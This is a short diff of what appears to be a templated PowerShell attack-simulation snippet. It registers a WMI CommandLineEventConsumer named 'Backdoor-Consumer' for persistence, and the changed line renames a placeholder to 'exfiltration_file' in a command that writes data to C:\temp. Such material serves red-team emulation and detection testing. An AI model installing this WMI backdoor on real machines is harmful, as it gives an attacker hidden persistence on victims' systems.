@@ -15,7 +15,7 @@
               QueryLanguage = 'WQL'
             }
             # Configure Consumer with Command line
-            $Command = "powershell.exe -Command Set-Content -Path C:\temp\{{ victim_file }} -Value {{ exfiltration_data }}"
+            $Command = "powershell.exe -Command Set-Content -Path C:\temp\{{ exfiltration_file }} -Value '{{ exfiltration_data }}'"
             $Consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
               Name = "Backdoor-Consumer"
               CommandLineTemplate = $Command }
